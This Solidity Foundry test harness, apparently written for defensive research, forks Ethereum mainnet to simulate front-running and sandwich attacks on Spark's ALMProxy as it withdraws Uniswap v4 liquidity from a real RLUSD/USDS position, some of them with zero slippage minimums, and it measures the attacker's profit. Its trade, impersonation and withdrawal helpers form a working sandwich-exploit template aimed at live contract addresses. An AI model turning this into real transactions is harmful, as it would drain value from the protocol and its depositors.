// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// Shared defensive research harness for PASSOS 397-399.
// Fork-local only: all public market trades and the RELAYER action are
// simulated in Foundry's in-memory fork. No transaction broadcasts.
// The ALMProxy is never artificially funded. Only the ATTACKER's private
// fork balances are set using cheatcode deal(). Synthetic capital is NOT real.
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {PoolKey} from "../../lib/uniswap-v4-core/src/types/PoolKey.sol";
import {Currency} from "../../lib/uniswap-v4-core/src/types/Currency.sol";
import {IV4Router} from "../../lib/uniswap-v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "../../lib/uniswap-v4-periphery/src/libraries/Actions.sol";

interface ILP397PositionManager {
    function ownerOf(uint256) external view returns (address);
    function getPositionLiquidity(uint256) external view returns (uint128);
    function poolKeys(bytes25) external view returns (PoolKey memory);
}
interface ILP397Controller {
    function RELAYER() external view returns (bytes32);
    function hasRole(bytes32,address) external view returns (bool);
    function decreaseLiquidityUniswapV4(bytes32,uint256,uint128,uint128,uint128) external;
}
interface ILP397Token {
    function balanceOf(address) external view returns (uint256);
}
interface ILP397Permit2 {
    function approve(address,address,uint160,uint48) external;
}
interface ILP397Router {
    function execute(bytes calldata,bytes[] calldata,uint256) external;
}
interface ILP397StateView {
    function getSlot0(bytes32) external view returns (uint160,int24,uint24,uint24);
}
abstract contract SparkForkLPAdversarialBase397 is Test {
    address internal constant PROXY = 0x1601843c5E9bC251A3272907010AFa41Fa18347E;
    address internal constant CONTROLLER = 0xc953972Cd006d1f12686fd7185c6D443b15900Cd;
    address internal constant RELAYER = 0x8a25A24EDE9482C4Fc0738F99611BE58F1c839AB;
    address internal constant RLUSD = 0x8292Bb45bf1Ee4d140127049757C2E0fF06317eD;
    address internal constant USDS = 0xdC035D45d973E3EC169d2276DDab16f1e407384F;
    address internal constant POSITION_MANAGER = 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e;
    address internal constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address internal constant ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    address internal constant STATE_VIEW = 0x7fFE42C4a5DEeA5b0feC41C94C136Cf115597227;
    address internal constant ATTACKER = address(0x397398399);
    bytes32 internal constant POOL =
        0x9035721b23481db3888fd201b9c2b26dbc3af60258bca65e669f2ed98dc8eb4f;
    uint256 internal constant NFT = 385168;

    PoolKey internal poolKey;
    uint128 internal withdrawLiq;

    function setUp() public virtual {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        require(ILP397PositionManager(POSITION_MANAGER).ownerOf(NFT) == PROXY,
                "INCONCLUSIVE: NFT no longer owned by ALMProxy");
        poolKey = ILP397PositionManager(POSITION_MANAGER).poolKeys(bytes25(POOL));
        assertEq(keccak256(abi.encode(poolKey)), POOL, "Changed PoolKey registration");
        assertEq(Currency.unwrap(poolKey.currency0), RLUSD, "Unexpected token0");
        assertEq(Currency.unwrap(poolKey.currency1), USDS, "Unexpected token1");
        assertTrue(ILP397Controller(CONTROLLER).hasRole(
            ILP397Controller(CONTROLLER).RELAYER(),RELAYER
        ),"Relayer no longer authorized");

        uint128 liquidity=ILP397PositionManager(POSITION_MANAGER).getPositionLiquidity(NFT);
        assertGt(liquidity,100, "INCONCLUSIVE: historical NFT has zero liquidity");
        withdrawLiq = liquidity / 100;
        assertGt(withdrawLiq,0);
        // Synthetic attacker capital exists ONLY in this throwaway local fork.
        deal(RLUSD, ATTACKER, 30_000_000e18, false);
        deal(USDS, ATTACKER, 30_000_000e18, false);
        vm.startPrank(ATTACKER);
        _approve(RLUSD, PERMIT2);
        _approve(USDS, PERMIT2);
        ILP397Permit2(PERMIT2).approve(
            RLUSD, ROUTER, type(uint160).max,uint48(block.timestamp+1 days)
        );
        ILP397Permit2(PERMIT2).approve(
            USDS, ROUTER, type(uint160).max,uint48(block.timestamp+1 days)
        );
        vm.stopPrank();

        console2.log("FORK ONLY, latest block",block.number);
        console2.log("Existing Spark NFT",NFT);
        console2.log("Real NFT liquidity removed per scenario",uint256(withdrawLiq));
        console2.log("ONLY attacker provided with local synthetic funds");
    }

    function _balance(address token,address who) internal view returns (uint256) {
        return ILP397Token(token).balanceOf(who);
    }

    function _approve(address token,address spender) internal {
        (bool ok,bytes memory result)=token.call(
            abi.encodeWithSignature("approve(address,uint256)",spender,type(uint256).max)
        );
        require(ok&&(result.length==0||(result.length==32&&abi.decode(result,(bool)))),
                "Synthetic attacker approve failed");
    }

    function _tick() internal view returns (int24 tick) {
        (,tick,,)=ILP397StateView(STATE_VIEW).getSlot0(POOL);
    }

    function _trade(address tokenIn,uint128 amount) internal returns (uint256 output) {
        require(tokenIn==RLUSD||tokenIn==USDS,"Unexpected attack trade token");
        address tokenOut=tokenIn==RLUSD?USDS:RLUSD;
        bytes memory actions=abi.encodePacked(
            uint8(Actions.SWAP_EXACT_IN_SINGLE),
            uint8(Actions.SETTLE_ALL),
            uint8(Actions.TAKE_ALL)
        );
        bytes[] memory params=new bytes[](3);
        params[0]=abi.encode(IV4Router.ExactInputSingleParams({
            poolKey:poolKey,
            zeroForOne:tokenIn==RLUSD,
            amountIn:amount,
            amountOutMinimum:0,
            hookData:bytes("")
        }));
        params[1]=abi.encode(tokenIn,amount);
        params[2]=abi.encode(tokenOut,0);
        bytes[] memory inputs=new bytes[](1);
        inputs[0]=abi.encode(actions,params);
        uint256 beforeOut=_balance(tokenOut,ATTACKER);
        vm.prank(ATTACKER);
        ILP397Router(ROUTER).execute(
            abi.encodePacked(uint8(0x10)), inputs,block.timestamp
        );
        output=_balance(tokenOut,ATTACKER)-beforeOut;
        assertGt(output,0,"Public swap returned nothing");
    }

    function _withdraw(uint128 min0,uint128 min1) internal
        returns (uint256 receivedRLUSD,uint256 receivedUSDS)
    {
        uint256 beforeRL=_balance(RLUSD,PROXY);
        uint256 beforeUS=_balance(USDS,PROXY);
        vm.prank(RELAYER); // RELAYER impersonated only in the local fork.
        ILP397Controller(CONTROLLER).decreaseLiquidityUniswapV4(
            POOL,NFT,withdrawLiq,min0,min1
        );
        receivedRLUSD=_balance(RLUSD,PROXY)-beforeRL;
        receivedUSDS=_balance(USDS,PROXY)-beforeUS;
        assertEq(_balance(RLUSD,ATTACKER)>=0,true); // no external payout assumption
    }

    // External-only wrappers permit independent revert-catching via try/catch.
    // The only authorized victim operation uses a real proxy balance in a fork.
    function runBaseline() external returns (uint256,uint256) {
        require(msg.sender==address(this),"Only test contract");
        return _withdraw(0,0);
    }

    function runFrontAndWithdraw(uint128 amount,bool frontWithUSDS,uint128 min0,uint128 min1)
        external returns(uint256,uint256,int24,int24)
    {
        require(msg.sender==address(this),"Only test contract");
        int24 beforeTick=_tick();
        _trade(frontWithUSDS?USDS:RLUSD,amount);
        int24 afterTick=_tick();
        (uint256 d0,uint256 d1)=_withdraw(min0,min1);
        return (d0,d1,beforeTick,afterTick);
    }

    function runSandwich(uint128 amount,bool frontWithUSDS,bool includeVictim)
        external returns (int256 pnl18,uint256 victimRL,uint256 victimUS,uint256 gasTrades,int24 preTick,int24 afterTick)
    {
        require(msg.sender==address(this),"Only test contract");
        uint256 beforeRL=_balance(RLUSD,ATTACKER);
        uint256 beforeUS=_balance(USDS,ATTACKER);
        address input=frontWithUSDS?USDS:RLUSD;
        address output=frontWithUSDS?RLUSD:USDS;
        preTick=_tick();
        uint256 gas1=gasleft();
        uint256 out=_trade(input,amount);
        gasTrades=gas1-gasleft();
        if(includeVictim){
            (victimRL,victimUS)=_withdraw(0,0);
        }
        require(out<=type(uint128).max,"Reverse input cannot fit uint128");
        uint256 gas2=gasleft();
        _trade(output,uint128(out));
        gasTrades+=gas2-gasleft();
        afterTick=_tick();
        pnl18=(int256(_balance(RLUSD,ATTACKER))-int256(beforeRL))+
              (int256(_balance(USDS,ATTACKER))-int256(beforeUS));
    }

    function _baselineWithRevert() internal returns(uint256 baseRL,uint256 baseUS) {
        uint256 snap=vm.snapshotState();
        (baseRL,baseUS)=this.runBaseline();
        vm.revertToState(snap);
        assertGt(baseRL+baseUS,0,"No baseline custody value");
    }
}
